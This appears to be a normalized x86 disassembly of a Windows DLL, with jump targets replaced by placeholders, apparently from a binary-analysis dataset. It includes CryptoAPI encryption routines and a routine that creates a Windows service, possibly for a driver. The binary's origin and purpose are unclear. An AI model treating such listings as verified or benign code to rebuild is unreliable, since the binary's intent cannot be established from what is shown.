mov ecx [ eax + 0x20 ]
and ecx 0xffffffe3
or ecx 0x2
mov [ eax + 0x20 ] ecx
mov eax [ ebp + 0x18 ]
fld [ eax ]
mov eax [ ebp + 0x8 ]
fstp [ eax + 0x10 ]
mov eax [ ebp + 0x8 ]
or [ eax + 0x60 ] ebx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x60 ]
and ecx 0xffffffe3
or ecx 0x2
mov [ eax + 0x60 ] ecx
fld [ edi ]
mov eax [ ebp + 0x8 ]
fstp [ eax + 0x50 ]
and [ eax + 0x20 ] 0xffffffe1
mov eax [ ebp + 0x18 ]
fld [ eax ]
mov eax [ ebp + 0x8 ]
fstp [ eax + 0x10 ]
mov eax [ ebp + 0x8 ]
or [ eax + 0x60 ] ebx
mov eax [ ebp + 0x8 ]
and [ eax + 0x60 ] 0xffffffe1
fld [ edi ]
mov eax [ ebp + 0x8 ]
fstp [ eax + 0x50 ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
and ecx 0xffffffe7
or ecx 0x4
jmp r-xdata
cmp eax ecx
jne r-xdata
mov [ eax ] ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
and ecx 0xfffffffe
or ecx 0x2
cmp eax ecx
jne r-xdata
test [ ecx + 0x8 ] 0x8
je r-xdata
and [ esi ] 0xfffffffe
call sub_1003b511
lea eax [ ebp + 0x8 ]
push eax
push ebx
push 0x0
push [ ebp + 0x10 ]
call [ RaiseException@IAT ]
mov ecx [ ebp + 0x8 ]
test [ ecx + 0x8 ] 0x10
je r-xdata
mov [ eax ] ecx
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x14 ]
shl ecx 0x5
xor ecx [ eax ]
and ecx 0x1ffe0
xor [ eax ] ecx
mov eax [ ebp + 0x8 ]
or [ eax + 0x20 ] ebx
cmp [ ebp + 0x20 ] edi
mov eax [ ebp + 0x8 ]
mov edi [ ebp + 0x1c ]
je r-xdata
mov eax [ ebp + 0x8 ]
and [ eax ] 0xffffffe3
jmp r-xdata
mov eax [ esi ]
mov ecx 0x300
and eax ecx
je r-xdata
mov eax [ ebp + 0x8 ]
or [ eax ] 0x3
jmp r-xdata
test [ ecx + 0x8 ] 0x4
je r-xdata
and [ esi ] 0xfffffffb
test [ ecx + 0x8 ] 0x2
je r-xdata
and [ esi ] 0xfffffff7
test [ ecx + 0x8 ] bl
je r-xdata
and [ esi ] 0xffffffef
mov eax [ ecx ]
and eax 0x3
xor ebx ebx
sub eax ebx
mov edx 0xfffff3ff
je r-xdata
and [ esi ] 0xffffffdf
and [ esi ] edx
dec eax
je r-xdata
mov eax [ esi ]
and eax edx
or eax 0x300
dec eax
je r-xdata
mov eax [ esi ]
and eax 0xfffff7ff
or eax 0x400
jmp r-xdata
dec eax
je r-xdata
fld [ ecx + 0x50 ]
fstp [ edi ]
fld [ ecx + 0x50 ]
fstp [ edi ]
jmp r-xdata
mov eax [ esi ]
and eax edx
or eax 0x200
jmp r-xdata
dec eax
jne r-xdata
mov [ esi ] eax
jmp r-xdata
mov eax [ esi ]
and eax 0xfffffbff
or eax 0x800
dec eax
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov [ esi ] eax
cmp [ ebp + 0x20 ] ebx
je r-xdata
and [ esi ] edx
jmp r-xdata
mov eax [ ecx ]
shr eax 0x2
and eax 0x7
sub eax ebx
je r-xdata
or [ esi ] 0xc00
jmp r-xdata
sub_10030a9f
mov edi edi
push ebp
mov ebp esp
mov eax [ ecx + 0x24 ]
cmp [ eax ] 0x0
je r-xdata
xor eax eax
mov eax [ ecx + 0x34 ]
mov eax [ eax ]
jmp r-xdata
push [ ebp + 0x8 ]
mov eax [ ecx ]
call [ eax + 0xc ]
mov eax [ ecx + 0x34 ]
dec [ eax ]
mov eax [ ecx + 0x24 ]
mov ecx [ eax ]
lea edx [ ecx + 0x2 ]
mov [ eax ] edx
mov eax [ ebp + 0x8 ]
mov [ ecx ] ax
jmp r-xdata
test eax eax
jle r-xdata
movzx eax ax
pop ebp
retn 0x4
sub_10030af0
push ebp
mov ebp esp
push ecx
push edi
lea edi [ ebp - 0x4 ]
mov edx esi
mov ecx ebx
call sub_1006b800
pop edi
test eax eax
js r-xdata
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x4 ]
push eax
mov eax esi
sub eax ecx
lea ecx [ ebx + ecx * 2 ]
mov edx 0x7fffffff
call sub_1006b860
sub_10030b40
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
and [ ebp - 0x10 ] 0x0
push ebx
push esi
mov esi [ ebp + 0x14 ]
mov eax ecx
mov ecx [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x8 ]
add eax 0x8
push eax
push edi
mov [ esi ] ecx
mov ecx [ edi ]
lea eax [ ebp - 0xc ]
push 0x0
push eax
mov [ ebp - 0x14 ] ecx
call sub_10026143
mov ebx eax
add esp 0x10
test ebx ebx
jg r-xdata
mov eax [ esi ]
mov ecx [ ebp + 0x10 ]
dec ebx
sub ecx eax
cmp ecx ebx
jge r-xdata
mov [ ebp - 0x10 ] 0x2
jmp r-xdata
test ebx ebx
jle r-xdata
mov eax [ ebp - 0x14 ]
mov [ edi ] eax
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x10 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1004c3b6
leave
retn 0x10
push ebx
lea ecx [ ebp - 0xc ]
push ecx
push eax
call sub_10078600
add esp 0xc
add [ esi ] ebx
sub_10030bd0
push ebp
mov ebp esp
push ecx
test esi esi
je r-xdata
mov eax 0x1
mov esp ebp
pop ebp
retn
test ebx ebx
je r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push edi
lea edx [ ebp - 0x4 ]
mov eax 0xf9
call sub_1001bb80
movzx ecx [ esi ]
or edi 0xffffffff
xor eax eax
test cx cx
je r-xdata
push esi
mov edx 0x7ffffffe
mov eax 0x104
mov ecx ebx
call sub_1006b860
test eax eax
jns r-xdata
mov edx [ ebp - 0x4 ]
mov eax 0x50
mov eax 0x4
pop edi
mov esp ebp
pop ebp
retn
movzx ecx [ esi + eax * 2 + 0x2 ]
inc eax
test cx cx
jne r-xdata
mov edi eax
cmp cx dx
jne r-xdata
cmp edi 0xffffffff
je r-xdata
test edi edi
jne r-xdata
cmp edi 0x7ffffffe
jbe r-xdata
lea eax [ edi + 0x2 ]
pop edi
mov esp ebp
pop ebp
retn
push esi
mov edx edi
mov eax 0x104
mov ecx ebx
call sub_1006b860
test eax eax
jns r-xdata
xor eax eax
mov [ ebx ] ax
mov eax 0x3
pop edi
mov esp ebp
pop ebp
retn
lea ecx [ esi + edi * 2 + 0x2 ]
push ecx
call [ StrToIntW@IAT ]
movzx eax ax
test ax ax
jne r-xdata
mov eax 0x3
pop edi
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov [ edx ] ax
xor eax eax
pop edi
mov esp ebp
pop ebp
retn
sub_10030cc0
push ebp
mov ebp esp
push 0xffffffff
push sub_1008247b
mov eax [ fs : 0x0 ]
push eax
sub esp 0x98
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0xa0 ] eax
mov eax [ rw-data ]
push r--data
xor edi edi
mov ecx rw-data
call sub_1005e510
test eax eax
je r-xdata
mov eax 0x1
mov eax [ rw-data ]
push r--data
mov ecx rw-data
call sub_1005e510
test eax eax
je r-xdata
mov eax [ rw-data ]
push r--data
mov ecx rw-data
call sub_1005e510
test eax eax
je r-xdata
mov eax [ rw-data ]
mov edi 0x8
cmp [ rw-data ] edi
jae r-xdata
mov ecx [ rw-data ]
push eax
lea esi [ ebp - 0x2c ]
call sub_10036f20
add esp 0x4
mov ecx esi
push r--data
push ecx
mov [ ebp - 0x4 ] 0x0
call sub_10025240
add esp 0x8
test al al
je r-xdata
mov eax rw-data
mov eax [ rw-data ]
cmp [ rw-data ] edi
jae r-xdata
mov ecx esi
call sub_10021250
mov eax 0x2
jmp r-xdata
mov ecx [ rw-data ]
push eax
lea esi [ ebp - 0x48 ]
call sub_10036f20
add esp 0x4
mov edx esi
push r--data
push edx
mov [ ebp - 0x4 ] 0x1
call sub_10025240
add esp 0x8
test al al
je r-xdata
mov eax rw-data
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
cmp [ rw-data ] edi
jae r-xdata
mov ecx esi
call sub_10021250
lea ecx [ ebp - 0x2c ]
call sub_10021250
mov eax 0x3
jmp r-xdata
mov ecx [ rw-data ]
push eax
lea esi [ ebp - 0x80 ]
call sub_10036f20
add esp 0x4
mov eax esi
push r--data
push eax
mov [ ebp - 0x4 ] 0x2
call sub_10025240
add esp 0x8
test al al
je r-xdata
mov eax rw-data
mov eax [ rw-data ]
cmp [ rw-data ] edi
jae r-xdata
mov ecx esi
call sub_10021250
lea ecx [ ebp - 0x48 ]
call sub_10021250
lea ecx [ ebp - 0x2c ]
call sub_10021250
mov eax 0x4
jmp r-xdata
mov ecx [ rw-data ]
push eax
lea esi [ ebp - 0x64 ]
call sub_10036f20
add esp 0x4
mov [ ebp - 0x4 ] 0x3
mov esi [ ebp - 0x50 ]
mov edi [ ebp - 0x64 ]
mov eax edi
cmp esi 0x10
jae r-xdata
mov eax rw-data
push 0x0
push r--data
push eax
call sub_10068a30
add esp 0xc
test eax eax
jne r-xdata
lea eax [ ebp - 0x64 ]
sete al
test al al
sete al
test al al
je r-xdata
cmp [ ebp - 0x54 ] eax
setne al
test eax eax
lea ecx [ ebp - 0x64 ]
call sub_10021250
lea ecx [ ebp - 0x80 ]
call sub_10021250
lea ecx [ ebp - 0x48 ]
call sub_10021250
lea ecx [ ebp - 0x2c ]
call sub_10021250
mov eax 0x5
jmp r-xdata
mov eax edi
cmp esi 0x10
jae r-xdata
push eax
call [ StrToIntA@IAT ]
cmp [ ebp - 0x6c ] 0x10
mov esi [ ebp - 0x80 ]
jae r-xdata
lea eax [ ebp - 0x64 ]
cmp [ ebp - 0x34 ] 0x10
mov edx [ ebp - 0x48 ]
jae r-xdata
lea esi [ ebp - 0x80 ]
cmp [ ebp - 0x18 ] 0x10
mov ecx [ ebp - 0x2c ]
jae r-xdata
lea edx [ ebp - 0x48 ]
push 0x0
push eax
push esi
push edx
push ecx
call sub_10069850
add esp 0x14
push eax
lea ecx [ ebp - 0x9c ]
call sub_1003feb0
lea ecx [ ebp - 0x9c ]
push r--data
push ecx
mov [ ebp - 0x4 ] 0x4
call sub_10025240
add esp 0x8
test al al
je r-xdata
lea ecx [ ebp - 0x2c ]
mov ecx [ ebp - 0xa0 ]
lea edx [ ebp - 0x9c ]
push edx
lea eax [ ebp + 0xc ]
push eax
call sub_100622c0
add esp 0x8
lea ecx [ ebp - 0x9c ]
call sub_10021250
lea ecx [ ebp - 0x64 ]
call sub_10021250
lea ecx [ ebp - 0x80 ]
call sub_10021250
lea ecx [ ebp - 0x48 ]
call sub_10021250
lea ecx [ ebp - 0x2c ]
call sub_10021250
xor eax eax
jmp r-xdata
lea ecx [ ebp - 0x9c ]
call sub_10021250
lea ecx [ ebp - 0x64 ]
call sub_10021250
lea ecx [ ebp - 0x80 ]
call sub_10021250
lea ecx [ ebp - 0x48 ]
call sub_10021250
lea ecx [ ebp - 0x2c ]
call sub_10021250
mov eax 0x6
jmp r-xdata
sub_10030ff0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov ecx [ ebp + 0xc ]
mov edx [ eax + 0x8 ]
mov eax [ eax + 0x4 ]
push ecx
push edx
call eax
add esp 0x8
pop ebp
retn
sub_10031010
push ebp
mov ebp esp
push 0xffffffff
push sub_1007fef6
mov eax [ fs : 0x0 ]
push eax
sub esp 0x1c
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi [ ebp + 0x8 ]
mov [ edi ] r--data
mov ecx edi
mov [ ebp - 0x4 ] 0x3
call sub_10049da0
mov eax [ edi + 0x384 ]
xor esi esi
cmp eax esi
je r-xdata
mov eax [ edi + 0x3a0 ]
mov [ ebp - 0x1c ] eax
cmp eax [ edi + 0x3a4 ]
je r-xdata
push eax
call [ FreeLibrary@IAT ]
mov eax [ edi + 0x3c0 ]
cmp eax esi
je r-xdata
mov ebx [ eax ]
mov [ ebp - 0x18 ] ebx
cmp ebx esi
je r-xdata
mov [ edi + 0x3c0 ] esi
mov [ edi + 0x3c4 ] esi
mov [ edi + 0x3c8 ] esi
mov eax [ edi + 0x3b0 ]
cmp eax esi
je r-xdata
push eax
call sub_10065045
add esp 0x4
add eax 0x4
mov [ ebp - 0x1c ] eax
cmp eax [ edi + 0x3a4 ]
jne r-xdata
mov eax [ ebx + 0x20 ]
mov ecx [ eax + 0x4 ]
lea edi [ ebx + 0x80 ]
mov [ ebp - 0x24 ] edi
mov [ ecx + edi - 0x60 ] r--data
test [ edi - 0x8 ] 0x1
lea esi [ edi - 0x48 ]
mov [ ebp - 0x28 ] esi
mov [ esi ] r--data
je r-xdata
mov [ edi + 0x3b0 ] esi
mov [ edi + 0x3b4 ] esi
mov [ edi + 0x3b8 ] esi
mov eax [ edi + 0x3a0 ]
cmp eax esi
je r-xdata
mov ebx [ edi + 0x3b4 ]
mov esi eax
cmp esi ebx
je r-xdata
mov eax [ esi + 0x10 ]
mov [ eax ] 0x0
mov ecx [ esi + 0x20 ]
mov [ ecx ] 0x0
mov edx [ esi + 0x30 ]
mov [ edx ] 0x0
mov eax [ esi + 0x14 ]
mov [ eax ] 0x0
mov ecx [ esi + 0x24 ]
mov [ ecx ] 0x0
mov edx [ esi + 0x34 ]
mov [ edx ] 0x0
and [ esi + 0x40 ] 0xfffffffe
mov [ esi + 0x3c ] 0x0
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0x6
mov eax [ esi + 0x38 ]
mov [ ebp - 0x14 ] eax
test eax eax
je r-xdata
mov edx [ esi + 0x10 ]
mov eax [ edx ]
push eax
call sub_10065045
add esp 0x4
mov [ edi + 0x3a0 ] esi
mov [ edi + 0x3a4 ] esi
mov [ edi + 0x3a8 ] esi
cmp [ edi + 0x34 ] 0x10
jb r-xdata
push eax
call sub_10065045
add esp 0x4
mov ecx [ edi + 0x3b0 ]
push ecx
call sub_10065045
add esp 0x4
xor esi esi
cmp [ esi + 0x14 ] 0x8
jb r-xdata
lea ecx [ esi + 0x4 ]
mov [ ebp - 0x4 ] 0x5
call sub_10061091
mov [ ebp - 0x4 ] 0x4
mov eax [ esi - 0x18 ]
mov ecx [ eax + 0x4 ]
mov [ ecx + esi - 0x18 ] r--data
mov edx [ esi - 0x8 ]
mov eax [ edx + 0x4 ]
mov [ eax + esi - 0x8 ] r--data
mov ecx [ esi - 0x18 ]
mov edx [ ecx + 0x4 ]
mov [ edx + esi - 0x18 ] r--data
push edi
mov [ edi ] r--data
call sub_1005927e
add esp 0x4
mov [ ebp - 0x4 ] 0x3
cmp [ ebx + 0x18 ] 0x8
jb r-xdata
mov ecx [ eax ]
mov [ ebp - 0x10 ] ecx
test ecx ecx
je r-xdata
mov [ edi + 0x34 ] 0xf
mov [ edi + 0x30 ] esi
mov [ edi + 0x20 ] 0x0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov edx [ edi + 0x20 ]
push edx
call sub_10065045
add esp 0x4
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] ax
add esi 0x24
cmp esi ebx
jne r-xdata
mov edx [ esi ]
push edx
call sub_10065045
add esp 0x4
xor ecx ecx
mov [ ebx + 0x18 ] 0x7
mov [ ebx + 0x14 ] 0x0
push ebx
mov [ ebx + 0x4 ] cx
call sub_10065045
mov edi [ ebp + 0x8 ]
mov eax [ ebp - 0x1c ]
add esp 0x4
xor esi esi
mov eax [ ebx + 0x4 ]
push eax
call sub_10065045
add esp 0x4
push eax
call sub_10065045
add esp 0x4
push 0x0
lea ecx [ ebp - 0x20 ]
call sub_100067d1
mov ecx [ ebp - 0x10 ]
mov eax [ ecx + 0x4 ]
test eax eax
je r-xdata
mov ebx [ ecx + 0x4 ]
neg ebx
sbb ebx ebx
lea ecx [ ebp - 0x20 ]
not ebx
call sub_1002470e
and ebx [ ebp - 0x10 ]
je r-xdata
cmp eax 0xffffffff
jae r-xdata
mov ebx [ ebp - 0x18 ]
mov eax [ ebp - 0x14 ]
mov eax [ ebx ]
mov edx [ eax ]
push 0x1
mov ecx ebx
call edx
dec eax
mov [ ecx + 0x4 ] eax
sub_100312dd
push ebp
mov ebp esp
sub esp 0x1c
push ebx
xor ebx ebx
push ebx
push 0x1
push r--data
push ebx
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] 0x3e8
mov [ ebp - 0x18 ] ebx
call [ CryptAcquireContextW@IAT ]
test eax eax
jne r-xdata
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0xc ]
cmp [ ebp + 0x10 ] ebx
jne r-xdata
call [ GetLastError@IAT ]
cmp eax 0x80090016
jne r-xdata
lea eax [ ebp - 0x14 ]
push eax
push ebx
push ebx
push 0x8003
push [ ebp - 0xc ]
call [ CryptCreateHash@IAT ]
test eax eax
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
push 0x800001
push 0x6801
push [ ebp - 0xc ]
call [ CryptGenKey@IAT ]
test eax eax
je r-xdata
xor eax eax
inc eax
lea eax [ ebp - 0xc ]
push eax
call sub_1000eb9b
jmp r-xdata
pop edi
pop esi
push ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp - 0x14 ]
call [ CryptHashData@IAT ]
test eax eax
je r-xdata
lea eax [ ebp - 0x4 ]
push eax
push ebx
push ebx
push 0x8
push ebx
push [ ebp - 0x8 ]
call [ CryptExportKey@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x14 ] ebx
je r-xdata
cmp eax ebx
jne r-xdata
cmp [ ebp - 0x8 ] ebx
je r-xdata
push [ ebp - 0x14 ]
call [ CryptDestroyHash@IAT ]
mov [ ebp - 0x14 ] ebx
lea eax [ ebp - 0x8 ]
push eax
push 0x800000
push [ ebp - 0x14 ]
push 0x6801
push [ ebp - 0xc ]
call [ CryptDeriveKey@IAT ]
test eax eax
je r-xdata
push [ ebp - 0x4 ]
mov ebx [ GetProcessHeap@IAT ]
push 0x8
call ebx
push eax
call [ HeapAlloc@IAT ]
mov [ ebp + 0x10 ] eax
test eax eax
je r-xdata
cmp [ ebp - 0xc ] ebx
je r-xdata
push [ ebp - 0x8 ]
call [ CryptDestroyKey@IAT ]
push 0x3e8
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov [ ebp + 0xc ] eax
cmp eax ebx
je r-xdata
xor ebx ebx
lea ecx [ ebp - 0x4 ]
push ecx
push eax
push 0x0
push 0x8
push 0x0
push [ ebp - 0x8 ]
call [ CryptExportKey@IAT ]
test eax eax
je r-xdata
xor eax eax
pop ebx
leave
retn 0x10
push ebx
push [ ebp - 0xc ]
call [ CryptReleaseContext@IAT ]
mov [ ebp + 0x13 ] 0x0
mov [ ebp + 0x14 ] ebx
mov [ ebp + 0x8 ] ebx
mov eax [ edi ]
add eax 0x4
push eax
push [ esi ]
push 0x8
call ebx
push eax
call [ HeapReAlloc@IAT ]
mov [ esi ] eax
test eax eax
je r-xdata
mov eax [ esi ]
add eax [ ebp + 0x8 ]
push [ ebp - 0x10 ]
add eax [ ebp - 0x18 ]
mov ebx [ ebp + 0xc ]
push eax
call sub_10021c50
mov eax [ ebp - 0x10 ]
pop ecx
pop ecx
push eax
mov [ ebp - 0x1c ] eax
lea eax [ ebp - 0x1c ]
push eax
movzx eax [ ebp + 0x13 ]
push ebx
push 0x0
push eax
push 0x0
push [ ebp - 0x8 ]
call [ CryptEncrypt@IAT ]
test eax eax
je r-xdata
mov [ ebp + 0x13 ] 0x1
mov [ ebp - 0x10 ] eax
add [ edi ] 0x4
mov eax [ edi ]
add eax [ ebp - 0x4 ]
push eax
push [ esi ]
push 0x8
call ebx
push eax
call [ HeapReAlloc@IAT ]
mov [ esi ] eax
test eax eax
je r-xdata
push [ ebp + 0xc ]
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
push [ ebp - 0x1c ]
push ebx
mov ebx [ esi ]
add ebx [ ebp + 0x8 ]
add ebx [ ebp - 0x18 ]
call sub_10021c50
push [ ebp - 0x10 ]
mov ebx [ ebp + 0xc ]
call sub_100111e0
add esp 0xc
cmp [ ebp + 0x13 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x4 ]
add [ edi ] ecx
mov eax [ edi ]
mov edx [ esi ]
sub eax ecx
sub eax 0x4
push eax
push edx
lea ebx [ edx + ecx + 0x4 ]
call sub_10021c50
mov eax [ ebp - 0x4 ]
mov ebx [ esi ]
add eax 0x4
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x4 ]
push 0x4
push eax
call sub_10021c50
push [ ebp - 0x4 ]
mov ebx [ esi ]
push [ ebp + 0x10 ]
add ebx 0x4
call sub_10021c50
add esp 0x18
push [ ebp + 0x10 ]
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
xor ebx ebx
jmp r-xdata
inc [ ebp + 0x14 ]
add [ ebp + 0x8 ] 0x3e8
jmp r-xdata
mov ecx [ ebp + 0x14 ]
imul ecx [ ebp - 0x10 ]
mov eax [ edi ]
sub eax ecx
sub eax [ ebp - 0x18 ]
cmp eax [ ebp - 0x10 ]
jae r-xdata
sub_100315a0
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
cmp ecx 0x3fffffff
jbe r-xdata
mov eax [ esi + 0x8 ]
sub eax [ esi ]
sar eax 0x2
cmp eax ecx
jae r-xdata
push r--data
call sub_100616c6
pop ebp
retn 0x4
push ebx
push edi
call sub_1000ffe0
mov ecx [ esi + 0x4 ]
mov ebx eax
mov eax [ esi ]
sub ecx eax
sar ecx 0x2
add ecx ecx
add ecx ecx
push ecx
push eax
push ebx
call sub_10077d10
mov eax [ esi ]
mov edi [ esi + 0x4 ]
sub edi eax
add esp 0xc
sar edi 0x2
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
lea ecx [ ebx + edi * 4 ]
lea eax [ ebx + edx * 4 ]
pop edi
mov [ esi ] ebx
mov [ esi + 0x8 ] eax
mov [ esi + 0x4 ] ecx
pop ebx
push eax
call sub_10065045
add esp 0x4
sub_10031620
push ebp
mov ebp esp
sub esp 0xa90
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0x14 ]
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x10 ]
mov [ ebp - 0xa88 ] eax
mov [ ebp - 0xa8c ] ecx
mov [ ebp - 0xa80 ] edx
mov [ ebp - 0xa90 ] ebx
test eax eax
je r-xdata
mov eax 0x1
test ecx ecx
je r-xdata
test edx edx
je r-xdata
test esi esi
je r-xdata
test edi edi
je r-xdata
test ebx ebx
je r-xdata
push 0xf003f
push 0x0
push 0x0
call [ OpenSCManagerW@IAT ]
mov ebx eax
test ebx ebx
jne r-xdata
push 0x0
lea eax [ ebp - 0xa74 ]
push eax
push 0x104
push edi
call [ GetFullPathNameW@IAT ]
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
lea ecx [ ebp - 0xa74 ]
push ecx
push 0x1
push 0x2
push 0x10
push 0xf003f
push esi
push esi
push ebx
call [ CreateServiceW@IAT ]
test eax eax
jne r-xdata
pop edi
pop esi
lea eax [ ebx + 0x2 ]
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov edi [ CloseServiceHandle@IAT ]
push eax
call edi
push ebx
call edi
lea edx [ ebp - 0x4c ]
mov eax 0x4
call sub_10050980
mov ecx edx
lea eax [ ebp - 0x86c ]
call sub_10049f00
push esi
mov esi 0x104
lea ebx [ ebp - 0x86c ]
call sub_10030af0
lea edx [ ebp - 0xa84 ]
mov eax 0x2
call sub_10050980
lea edx [ ebp - 0xa7c ]
mov eax 0x1
call sub_10050980
lea edx [ ebp - 0xa78 ]
mov eax 0x3
call sub_10050980
mov esi [ ebp - 0xa88 ]
push edx
push esi
call [ StrStrW@IAT ]
xor edi edi
lea ecx [ ebp - 0x664 ]
test eax eax
mov edx 0x30c
mov eax ecx
je r-xdata
push ebx
call [ CloseServiceHandle@IAT ]
pop edi
pop esi
mov eax 0x3
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
sub esi ecx
lea ebx [ ebp - 0xa7c ]
sub ebx ecx
test edx edx
jne r-xdata
movzx ecx [ esi + eax ]
test cx cx
je r-xdata
test edx edx
jne r-xdata
movzx ecx [ ebx + eax ]
test cx cx
je r-xdata
xor edx edx
mov [ eax ] dx
test edi edi
je r-xdata
sub eax 0x2
mov edi 0x8007007a
mov [ eax ] cx
add eax 0x2
dec edx
jne r-xdata
xor edx edx
mov [ eax ] dx
test edi edi
je r-xdata
sub eax 0x2
mov edi 0x8007007a
mov [ eax ] cx
add eax 0x2
dec edx
jne r-xdata
lea eax [ ebp - 0xa78 ]
push eax
mov esi 0x30c
lea ebx [ ebp - 0x664 ]
call sub_10030af0
test eax eax
je r-xdata
pop edi
pop esi
lea eax [ edx + 0x7 ]
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
lea ecx [ edx + 0x7ffffcf2 ]
test ecx ecx
je r-xdata
jmp r-xdata
push esi
mov esi 0x30c
lea ebx [ ebp - 0x664 ]
call sub_10030af0
test eax eax
je r-xdata
pop edi
pop esi
lea eax [ edx + 0x4 ]
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
lea ecx [ edx + 0x7ffffcf2 ]
test ecx ecx
je r-xdata
jmp r-xdata
mov edi [ ebp - 0xa8c ]
lea ecx [ ebp - 0xa78 ]
push ecx
push edi
call [ StrStrW@IAT ]
test eax eax
je r-xdata
pop edi
pop esi
mov eax 0x8
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0xa7c ]
push eax
lea ebx [ ebp - 0x664 ]
call sub_10030af0
test eax eax
je r-xdata
pop edi
pop esi
mov eax 0x5
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
push edi
mov esi 0x30c
lea ebx [ ebp - 0x664 ]
call sub_10030af0
test eax eax
je r-xdata
lea edx [ ebp - 0xa7c ]
push edx
lea ebx [ ebp - 0x664 ]
call sub_10030af0
test eax eax
je r-xdata
pop edi
pop esi
mov eax 0x6
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0xa78 ]
push eax
push edi
call [ StrStrW@IAT ]
test eax eax
je r-xdata
pop edi
pop esi
mov eax 0xa
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
pop edi
pop esi
mov eax 0x9
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0xa84 ]
push edx
mov esi 0x30c
lea ebx [ ebp - 0x664 ]
call sub_10030af0
test eax eax
je r-xdata
lea ecx [ ebp - 0xa7c ]
push ecx
lea ebx [ ebp - 0x664 ]
call sub_10030af0
test eax eax
je r-xdata
lea eax [ ebp - 0xa78 ]
push eax
lea ebx [ ebp - 0x664 ]
call sub_10030af0
test eax eax
je r-xdata
pop edi
pop esi
mov eax 0xc
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
pop edi
pop esi
mov eax 0xb
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0xa80 ]
push ecx
lea ebx [ ebp - 0x664 ]
call sub_10030af0
test eax eax
je r-xdata
pop edi
pop esi
mov eax 0xd
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0xa90 ]
push 0x1
push edx
lea ecx [ ebp - 0x664 ]
lea eax [ ebp - 0x86c ]
mov edx 0x80000002
call sub_10010710
add esp 0x8
test eax eax
je r-xdata
pop edi
pop esi
mov eax 0xe
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1004c3b6
mov esp ebp
